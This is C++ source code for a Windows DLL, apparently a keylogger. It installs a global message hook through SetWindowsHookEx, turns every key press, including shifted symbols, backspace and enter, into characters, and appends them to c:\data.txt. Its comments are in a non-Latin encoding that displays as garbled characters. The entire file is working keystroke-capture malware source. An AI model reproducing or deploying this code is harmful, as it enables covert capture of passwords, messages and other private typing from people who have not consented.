// Keyboard.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
HINSTANCE g_hInstance = NULL; 
HHOOK  Kg_hHook = NULL;    
char Buff[10]={0};
#define DEBUG_LOG         "c:\\data.txt" 
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	//�õ�dllģ����
	g_hInstance = (HINSTANCE)hModule;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		if(Kg_hHook !=NULL) UnhookWindowsHookEx(Kg_hHook);
		break;
	case DLL_THREAD_DETACH:
		if (Kg_hHook != NULL) UnhookWindowsHookEx(Kg_hHook);
		break;
	}
    return TRUE;
}



int DataToFile( char *buff ) 
{ 
  //����CreateFile������ֻд��ʽ��һ���ļ�
	HANDLE hFile=CreateFile("c:\\data.txt",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//����SetFilePointer���������ļ�ָ��λ�ã��ƶ����ļ�ĩβ
	if(SetFilePointer(hFile,0,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error \n");	
	    return 0;	
	}
	DWORD dwWrite;
	//��buff�е�����д�뵽�ļ�ĩβ
	if(!WriteFile(hFile,buff,strlen(buff),&dwWrite,NULL))
	{
		printf("WriteFile error \n");	
	    return 0;	
	}
	CloseHandle(hFile);
	return 0;
} 

LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode < 0 )
		return CallNextHookEx(Kg_hHook, nCode, wParam, lParam);
	if (nCode==HC_ACTION)
	{
		MSG *pEventMsg=(MSG*)lParam;
		//�ж��Ƿ��ɻ�����Ϣ
		if (pEventMsg->message==WM_KEYDOWN)
		{

			//�õ�������ASC��ֵ
			int vKey=pEventMsg->wParam;
			char ch;
			char str[10];
			memset(Buff,0,10);
			memset(str,0,10);
			const int KeyMask=0x80000000;
			//�õ�Shift����״̬
			int iShift=GetKeyState(0x10);
			//�õ�Caps Lock����״̬
			int iCapital=GetKeyState(0x14);
			//�õ�NumLock����״̬
			int iNumLock=GetKeyState(0x90);
			bool bShift=(iShift & KeyMask)==KeyMask;
			bool bCapital=(iCapital & 1)==1;
			bool bNumLock=(iNumLock & 1)==1;
			//�жϰ����Ƿ�����������������
			if (vKey >=48 && vKey<=57)
			{
				//asc��ת�����ַ�
				switch (vKey)
				{
				case 48: if (!bShift) ch='0';else ch=')';break;
				case 49: if (!bShift) ch='1';else ch='!';break;
				case 50: if (!bShift) ch='2';else ch='@';break;
				case 51: if (!bShift) ch='3';else ch='#';break;
				case 52: if (!bShift) ch='4';else ch='$';break;
				case 53: if (!bShift) ch='5';else ch='%';break;
				case 54: if (!bShift) ch='6';else ch='^';break; 
				case 55: if (!bShift) ch='7';else ch='&';break;
				case 56: if (!bShift) ch='8';else ch='*';break;
				case 57: if (!bShift) ch='9';else ch='(';break;
				}
				Buff[0]=ch;
				DataToFile(Buff);	
			}
			//�жϰ����Ƿ���������������ĸ
			if (vKey >=65 && vKey<=90)
				
			{
				//�ж�Caps Lock���Ƿ���
				if (!bCapital)
				{
					//�ж�Shift���Ƿ���
					if (bShift) 
						ch=vKey; 
					else 
						ch=vKey+32;
				}
				else
				{
					if (bShift) ch=vKey+32; else ch=vKey;
					
				}
				Buff[0]=ch;
				DataToFile(Buff);
				
			}
			//�жϰ����Ƿ���������������
			if (vKey >=96 && vKey<=105)
			{
				if (bNumLock) 
				{
					switch (vKey)
					{
					case 96: ch='0';break;
					case 97: ch='1';break;
					case 98: ch='2';break;
					case 99: ch='3';break;
					case 100: ch='4';break;
					case 101: ch='5';break;
					case 102: ch='6';break; 
					case 103: ch='7';break;
					case 104: ch='8';break;
					case 105: ch='9';break;
					}
					Buff[0]=ch;
					DataToFile(Buff);	
				}
			}
			//�жϰ����Ƿ������������ķ��ż�
			if (vKey>=186 && vKey<=222)
			{
				//��asc��ת�����ַ�
				switch (vKey)
				{
				case 186:if (!bShift) ch=';'; else ch=':';break;
				case 187:if (!bShift) ch='='; else ch='+';break;
				case 188:if (!bShift) ch=','; else ch='<' ;break;
				case 189:if (!bShift) ch='-'; else ch='_';break;
				case 190:if (!bShift) ch='.'; else ch=' >';break;
				case 191:if (!bShift) ch='/'; else ch='?';break;
				case 192:if (!bShift) ch='`'; else ch='~';break;
				case 219:if (!bShift) ch='['; else ch='{';break;
				case 220:if (!bShift) ch='\\'; else ch='|';break;
				case 221:if (!bShift) ch=']'; else ch='}';break;
				case 222:if (!bShift) ch='\''; else ch='\"';break;
				default:break;
				}
				Buff[0]=ch;
				DataToFile(Buff);
			}
			switch (vKey)
			{
				//�ж��Ƿ����˸��
			case 8:
				{
					strcpy(Buff,"[BK]");
					DataToFile(Buff);
					break;
				}
				//�ж��Ƿ��ǻس���
			case 13:
				{
					strcpy(Buff,"[enter]");
					DataToFile(Buff);
					break;		
				}
			default:break;
			}
         }	
    }
	return CallNextHookEx(Kg_hHook, nCode, wParam, lParam);
}


BOOL StartHook()
{
	if (Kg_hHook!=NULL) 
		return FALSE;
	//��װ����
	Kg_hHook = SetWindowsHookEx(WH_GETMESSAGE, KeyHookProc, g_hInstance, NULL);
	return TRUE; 
}



BOOL StopHook()
{
	if (Kg_hHook != NULL) 
	{
		if(!UnhookWindowsHookEx(Kg_hHook))
			return FALSE;
		Kg_hHook = NULL;
	}

	return TRUE;
}
